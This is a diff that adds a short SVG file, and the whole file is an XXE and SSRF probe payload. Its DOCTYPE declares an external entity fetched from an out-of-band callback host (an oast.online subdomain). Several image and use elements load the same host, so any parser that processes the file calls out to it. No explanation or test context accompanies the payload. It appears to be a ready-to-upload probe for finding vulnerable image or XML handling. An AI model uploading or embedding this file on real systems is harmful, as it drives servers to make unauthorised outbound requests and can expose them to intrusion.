@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://d8ff8jagp7go24r9t70g1q467wu7e3fer.oast.online/svg-doctype-xxe">]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
+  <image xlink:href="http://d8ff8jagp7go24r9t70g1q467wu7e3fer.oast.online/svg-file-xlink" width="50" height="50"/>
+  <image href="http://d8ff8jagp7go24r9t70g1q467wu7e3fer.oast.online/svg-file-href" width="50" height="50"/>
+  <use xlink:href="http://d8ff8jagp7go24r9t70g1q467wu7e3fer.oast.online/svg-file-use"/>
+  <text>&xxe;</text>
+</svg>
